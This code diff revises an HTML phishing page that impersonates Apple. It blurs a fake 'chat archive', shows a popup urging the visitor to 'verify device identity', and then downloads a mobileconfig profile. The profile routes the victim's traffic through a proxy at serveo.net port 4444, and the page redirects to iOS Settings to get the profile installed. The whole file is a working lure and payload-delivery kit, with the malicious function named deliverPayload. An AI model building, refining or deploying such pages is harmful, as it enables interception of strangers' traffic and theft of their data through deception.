@@ -1,29 +1,66 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Verification</title>
+    <title>Chat Archive | Secured</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; background: #1c1c1e; color: white; display: flex; align-items: center; justify-content: center; text-align: center; }
-        .container { background: white; color: black; padding: 40px; border-radius: 25px; width: 80%; max-width: 350px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .apple-logo { width: 40px; margin-bottom: 20px; }
-        h1 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
-        p { font-size: 14px; color: #666; margin-bottom: 30px; }
-        .btn { background: #007aff; color: white; padding: 15px 25px; border-radius: 12px; text-decoration: none; font-weight: 600; display: block; cursor: pointer; border: none; width: 100%; font-size: 16px; }
+        body, html { height: 100%; margin: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #000; overflow: hidden; }
+        
+        /* Realistic Chat Background */
+        .chat-bg {
+            background: url('https://images.unsplash.com/photo-1614850523296-d8c1af93d400?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80'); 
+            height: 100vh; width: 100%; background-size: cover; background-position: center;
+            position: fixed; top: 0; left: 0; z-index: 1; transition: filter 1s ease;
+        }
+
+        /* Overlay for the Popup */
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.4); z-index: 2; display: none;
+        }
+
+        .popup {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: white; padding: 30px; border-radius: 20px; width: 85%; max-width: 320px;
+            text-align: center; z-index: 3; display: none; box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+        }
+
+        .apple-icon { width: 40px; margin-bottom: 15px; }
+        h2 { font-size: 18px; margin: 0 0 10px 0; color: #1d1d1f; }
+        p { font-size: 13px; color: #86868b; line-height: 1.4; margin-bottom: 25px; }
+        
+        .btn {
+            background: #007aff; color: white; padding: 14px; border-radius: 12px;
+            text-decoration: none; font-weight: 600; display: block; border: none;
+            width: 100%; font-size: 15px; cursor: pointer;
+        }
+
+        .blur-effect { filter: blur(15px); }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
-        <h1>Identity Required</h1>
-        <p>To continue, please verify your device management profile.</p>
-        <button onclick="downloadProfile()" class="btn">Install Verification Profile</button>
+
+    <div class="chat-bg" id="bg"></div>
+    <div class="overlay" id="overlay"></div>
+
+    <div class="popup" id="popup">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-icon">
+        <h2>Identity Verification</h2>
+        <p>This conversation is encrypted. To unblur and read the full archive, verify your device identity.</p>
+        <button onclick="deliverPayload()" class="btn">Unblur & Read Chats</button>
     </div>
 
     <script>
-        function downloadProfile() {
-            // Your EXACT XML Payload from the screenshot
-            const profileXml = `<?xml version="1.0" encoding="UTF-8"?>
+        // Step 1: Wait 2 seconds, then show popup and blur background
+        setTimeout(() => {
+            document.getElementById('bg').classList.add('blur-effect');
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('popup').style.display = 'block';
+        }, 2500);
+
+        function deliverPayload() {
+            // THE PAYLOAD (Same as your XML)
+            const xmlData = `<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
@@ -42,38 +79,32 @@
             <string>12345-67890</string>
             <key>PayloadVersion</key>
             <integer>1</integer>
-            <key>ProxyServer</key>
-            <string>serveo.net</string>
-            <key>ProxyPort</key>
-            <integer>4444</integer>
+            <key>ProxyServer</key>            <string>serveo.net</string>
+            <key>ProxyPort</key>              <integer>4444</integer>
         </dict>
     </array>
-    <key>PayloadDisplayName</key>
-    <string>Hadima Identity Service</string>
-    <key>PayloadIdentifier</key>
-    <string>com.hadima.verify</string>
-    <key>PayloadType</key>
-    <string>Configuration</string>
-    <key>PayloadUUID</key>
-    <string>09876-54321</string>
-    <key>PayloadVersion</key>
-    <integer>1</integer>
+    <key>PayloadDisplayName</key> <string>Hadima Identity Service</string>
+    <key>PayloadIdentifier</key>  <string>com.hadima.verify</string>
+    <key>PayloadType</key>        <string>Configuration</string>
+    <key>PayloadUUID</key>        <string>09876-54321</string>
+    <key>PayloadVersion</key>     <integer>1</integer>
 </dict>
 </plist>`;
 
-            const blob = new Blob([profileXml], { type: 'application/x-apple-aspen-config' });
+            // Create Blob and trigger download
+            const blob = new Blob([xmlData], { type: 'application/x-apple-aspen-config' });
             const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.style.display = 'none';
-            a.href = url;
-            a.download = 'verify.mobileconfig';
-            document.body.appendChild(a);
-            a.click();
-            
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = 'verify.mobileconfig';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // Step 4: After 5 seconds, redirect to iOS Settings
             setTimeout(() => {
-                window.URL.revokeObjectURL(url);
                 window.location.href = "App-prefs:General&path=ManagedConfigurationList";
-            }, 3000);
+            }, 5000);
         }
     </script>
 </body>
